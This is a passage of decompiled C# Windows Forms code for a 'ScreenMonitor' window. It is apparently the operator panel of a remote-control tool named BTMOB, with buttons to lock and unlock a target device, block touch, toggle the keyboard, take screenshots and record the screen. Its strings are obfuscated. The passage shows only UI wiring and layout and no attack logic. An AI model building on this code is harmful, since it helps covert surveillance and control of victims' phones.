using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace BTMOB;

[DesignerGenerated]
public class ScreenMonitor : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("viewimage")]
	private PictureBox _viewimage;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("confbtn")]
	private DrakeUIButtonIcon _confbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("coloskeletonpick")]
	private DrakeUIColorPicker _coloskeletonpick;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("unlockbtn")]
	private DrakeUIButtonIcon _unlockbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mscrtshots")]
	private DrakeUIButtonIcon _mscrtshots;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("scrshot")]
	private DrakeUIButtonIcon _scrshot;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("sondup")]
	private DrakeUIButtonIcon _sondup;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("soundown")]
	private DrakeUIButtonIcon _soundown;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("keybordon")]
	private DrakeUIButtonIcon _keybordon;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("keybordoff")]
	private DrakeUIButtonIcon _keybordoff;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("lokbtn")]
	private DrakeUIButtonIcon _lokbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon11")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon10")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon10;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon9")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("inputtext")]
	private DrakeUITextBox _inputtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("smallviewimage")]
	private PictureBox _smallviewimage;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ctrlbtn")]
	private DrakeUIButtonIcon _ctrlbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("blockbtn")]
	private DrakeUIButtonIcon _blockbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("skltonbtn")]
	private DrakeUIButtonIcon _skltonbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("recscr")]
	private DrakeUIButtonIcon _recscr;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savertimer")]
	private Timer _savertimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("autorotbtn")]
	private DrakeUIButtonIcon _autorotbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("startbtn")]
	private DrakeUIButtonIcon _startbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("stopbtn")]
	private DrakeUIButtonIcon _stopbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("blocktoch")]
	private DrakeUIButtonIcon _blocktoch;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("slideTimer")]
	private Timer _slideTimer;

	public BTClient Btcli;

	public int FPS;

	private WebSocketClient websockclient;

	public bool LiveisBigger;

	public string CurrentState;

	public Size screenSize;

	public string screenorinta;

	public string Lastrotate;

	private bool isDown;

	private bool isClick;

	private int startX;

	private int startY;

	private List<Point> trackPoints;

	private int dragThreshold;

	private int slideTargetWidth;

	private int slideStep;

	private bool panelExpanded;

	private const int PanelWidth = 100;

	private DateTime mouseDownTime;

	internal virtual PictureBox viewimage
	{
		[CompilerGenerated]
		get
		{
			return _viewimage;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = viewimage_MouseDown;
			MouseEventHandler value3 = viewimage_MouseMove;
			MouseEventHandler value4 = viewimage_MouseUp;
			PictureBox pictureBox = _viewimage;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
				pictureBox.MouseMove -= value3;
				pictureBox.MouseUp -= value4;
			}
			_viewimage = value;
			pictureBox = _viewimage;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
				pictureBox.MouseMove += value3;
				pictureBox.MouseUp += value4;
			}
		}
	}

	[field: AccessedThroughProperty("confpanel")]
	internal virtual Panel confpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("comboTargts")]
	internal virtual DrakeUIComboBox comboTargts
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon confbtn
	{
		[CompilerGenerated]
		get
		{
			return _confbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Toggleleftpanel_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _confbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_confbtn = value;
			drakeUIButtonIcon = _confbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIColorPicker coloskeletonpick
	{
		[CompilerGenerated]
		get
		{
			return _coloskeletonpick;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIColorPicker.OnColorChanged value2 = DrakeUIColorPicker1_ValueChanged;
			DrakeUIColorPicker drakeUIColorPicker = _coloskeletonpick;
			if (drakeUIColorPicker != null)
			{
				drakeUIColorPicker.ValueChanged -= value2;
			}
			_coloskeletonpick = value;
			drakeUIColorPicker = _coloskeletonpick;
			if (drakeUIColorPicker != null)
			{
				drakeUIColorPicker.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon unlockbtn
	{
		[CompilerGenerated]
		get
		{
			return _unlockbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _unlockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_unlockbtn = value;
			drakeUIButtonIcon = _unlockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel11")]
	internal virtual Panel Panel11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon mscrtshots
	{
		[CompilerGenerated]
		get
		{
			return _mscrtshots;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon7_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _mscrtshots;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_mscrtshots = value;
			drakeUIButtonIcon = _mscrtshots;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon scrshot
	{
		[CompilerGenerated]
		get
		{
			return _scrshot;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon8_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _scrshot;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_scrshot = value;
			drakeUIButtonIcon = _scrshot;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel14")]
	internal virtual Panel Panel14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel10")]
	internal virtual Panel Panel10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon sondup
	{
		[CompilerGenerated]
		get
		{
			return _sondup;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon5_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _sondup;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_sondup = value;
			drakeUIButtonIcon = _sondup;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon soundown
	{
		[CompilerGenerated]
		get
		{
			return _soundown;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon6_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _soundown;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_soundown = value;
			drakeUIButtonIcon = _soundown;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel8")]
	internal virtual Panel Panel8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon keybordon
	{
		[CompilerGenerated]
		get
		{
			return _keybordon;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _keybordon;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_keybordon = value;
			drakeUIButtonIcon = _keybordon;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon keybordoff
	{
		[CompilerGenerated]
		get
		{
			return _keybordoff;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _keybordoff;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_keybordoff = value;
			drakeUIButtonIcon = _keybordoff;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon lokbtn
	{
		[CompilerGenerated]
		get
		{
			return _lokbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _lokbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_lokbtn = value;
			drakeUIButtonIcon = _lokbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("TableLayoutPanel1")]
	internal virtual TableLayoutPanel TableLayoutPanel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon11
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon11_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon11;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon11 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon11;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon10
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon10_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon10;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon10 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon10;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon9
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon9_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon9;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon9 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon9;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W11")]
	internal virtual DrakeWidth_W DrakeWidth_W11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox inputtext
	{
		[CompilerGenerated]
		get
		{
			return _inputtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyEventHandler value2 = pintext_KeyDown;
			DrakeUITextBox drakeUITextBox = _inputtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.KeyDown -= value2;
			}
			_inputtext = value;
			drakeUITextBox = _inputtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.KeyDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel15")]
	internal virtual Panel Panel15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox smallviewimage
	{
		[CompilerGenerated]
		get
		{
			return _smallviewimage;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PictureBox1_Click;
			PictureBox pictureBox = _smallviewimage;
			if (pictureBox != null)
			{
				pictureBox.Click -= value2;
			}
			_smallviewimage = value;
			pictureBox = _smallviewimage;
			if (pictureBox != null)
			{
				pictureBox.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("BTtiptool")]
	internal virtual DrakeUIToolTip BTtiptool
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon ctrlbtn
	{
		[CompilerGenerated]
		get
		{
			return _ctrlbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ctrlbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _ctrlbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_ctrlbtn = value;
			drakeUIButtonIcon = _ctrlbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon blockbtn
	{
		[CompilerGenerated]
		get
		{
			return _blockbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = blockbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _blockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_blockbtn = value;
			drakeUIButtonIcon = _blockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon skltonbtn
	{
		[CompilerGenerated]
		get
		{
			return _skltonbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon12_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _skltonbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_skltonbtn = value;
			drakeUIButtonIcon = _skltonbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon recscr
	{
		[CompilerGenerated]
		get
		{
			return _recscr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = recscr_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _recscr;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_recscr = value;
			drakeUIButtonIcon = _recscr;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual Timer savertimer
	{
		[CompilerGenerated]
		get
		{
			return _savertimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = savertimer_Tick;
			Timer timer = _savertimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_savertimer = value;
			timer = _savertimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon autorotbtn
	{
		[CompilerGenerated]
		get
		{
			return _autorotbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _autorotbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_autorotbtn = value;
			drakeUIButtonIcon = _autorotbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon startbtn
	{
		[CompilerGenerated]
		get
		{
			return _startbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = entrbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _startbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_startbtn = value;
			drakeUIButtonIcon = _startbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon stopbtn
	{
		[CompilerGenerated]
		get
		{
			return _stopbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = stopbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _stopbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_stopbtn = value;
			drakeUIButtonIcon = _stopbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon blocktoch
	{
		[CompilerGenerated]
		get
		{
			return _blocktoch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = blocktoch_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _blocktoch;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_blocktoch = value;
			drakeUIButtonIcon = _blocktoch;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual Timer slideTimer
	{
		[CompilerGenerated]
		get
		{
			return _slideTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = slideTimer_Tick;
			Timer timer = _slideTimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_slideTimer = value;
			timer = _slideTimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.ScreenMonitor));
		this.viewimage = new System.Windows.Forms.PictureBox();
		this.confpanel = new System.Windows.Forms.Panel();
		this.Panel15 = new System.Windows.Forms.Panel();
		this.smallviewimage = new System.Windows.Forms.PictureBox();
		this.Panel11 = new System.Windows.Forms.Panel();
		this.scrshot = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.mscrtshots = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel14 = new System.Windows.Forms.Panel();
		this.Panel10 = new System.Windows.Forms.Panel();
		this.sondup = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.soundown = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel8 = new System.Windows.Forms.Panel();
		this.keybordon = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.keybordoff = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.lokbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.unlockbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.coloskeletonpick = new DrakeUI.Framework.DrakeUIColorPicker();
		this.ctrlbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.blocktoch = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.blockbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.skltonbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.recscr = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.autorotbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.confbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.comboTargts = new DrakeUI.Framework.DrakeUIComboBox();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.stopbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W11 = new DrakeUI.Framework.DrakeWidth_W();
		this.startbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.TableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
		this.DrakeUIButtonIcon11 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon10 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon9 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.inputtext = new DrakeUI.Framework.DrakeUITextBox();
		this.BTtiptool = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.savertimer = new System.Windows.Forms.Timer(this.components);
		this.slideTimer = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.viewimage).BeginInit();
		this.confpanel.SuspendLayout();
		this.Panel15.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.smallviewimage).BeginInit();
		this.Panel11.SuspendLayout();
		this.Panel10.SuspendLayout();
		this.Panel8.SuspendLayout();
		this.Panel7.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.TableLayoutPanel1.SuspendLayout();
		base.SuspendLayout();
		this.myscr.Size = new System.Drawing.Size(42, 25);
		this.myscr.Visible = false;
		this.pinbtn.Location = new System.Drawing.Point(309, 5);
		this.minibtn.Location = new System.Drawing.Point(351, 5);
		this.closbtn.Location = new System.Drawing.Point(393, 5);
		this.mytitle.Font = new System.Drawing.Font(EXGuarder._46447843, 8f, System.Drawing.FontStyle.Bold);
		this.mytitle.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(425, 16);
		this.tobpanelsti.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(435, 24);
		this.viewimage.Dock = System.Windows.Forms.DockStyle.Fill;
		this.viewimage.Location = new System.Drawing.Point(52, 107);
		this.viewimage.Name = EXGuarder._3B5E644B;
		this.viewimage.Size = new System.Drawing.Size(385, 646);
		this.viewimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.viewimage.TabIndex = 40;
		this.viewimage.TabStop = false;
		this.confpanel.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.confpanel.Controls.Add(this.Panel15);
		this.confpanel.Controls.Add(this.Panel11);
		this.confpanel.Controls.Add(this.Panel14);
		this.confpanel.Controls.Add(this.Panel10);
		this.confpanel.Controls.Add(this.Panel8);
		this.confpanel.Controls.Add(this.Panel7);
		this.confpanel.Controls.Add(this.coloskeletonpick);
		this.confpanel.Controls.Add(this.ctrlbtn);
		this.confpanel.Controls.Add(this.blocktoch);
		this.confpanel.Controls.Add(this.blockbtn);
		this.confpanel.Controls.Add(this.skltonbtn);
		this.confpanel.Controls.Add(this.recscr);
		this.confpanel.Controls.Add(this.autorotbtn);
		this.confpanel.Dock = System.Windows.Forms.DockStyle.Left;
		this.confpanel.Location = new System.Drawing.Point(2, 62);
		this.confpanel.Name = EXGuarder._370D633C;
		this.confpanel.Size = new System.Drawing.Size(50, 732);
		this.confpanel.TabIndex = 41;
		this.Panel15.Controls.Add(this.smallviewimage);
		this.Panel15.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel15.Location = new System.Drawing.Point(0, 579);
		this.Panel15.Name = EXGuarder._75690D5D;
		this.Panel15.Size = new System.Drawing.Size(50, 153);
		this.Panel15.TabIndex = 65;
		this.smallviewimage.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.smallviewimage.Cursor = System.Windows.Forms.Cursors.Hand;
		this.smallviewimage.Dock = System.Windows.Forms.DockStyle.Fill;
		this.smallviewimage.Location = new System.Drawing.Point(0, 0);
		this.smallviewimage.Name = EXGuarder._6B012033;
		this.smallviewimage.Size = new System.Drawing.Size(50, 153);
		this.smallviewimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.smallviewimage.TabIndex = 41;
		this.smallviewimage.TabStop = false;
		this.Panel11.Controls.Add(this.scrshot);
		this.Panel11.Controls.Add(this.mscrtshots);
		this.Panel11.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel11.Location = new System.Drawing.Point(0, 497);
		this.Panel11.Name = EXGuarder._1A44626B;
		this.Panel11.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.Panel11.Size = new System.Drawing.Size(50, 82);
		this.Panel11.TabIndex = 61;
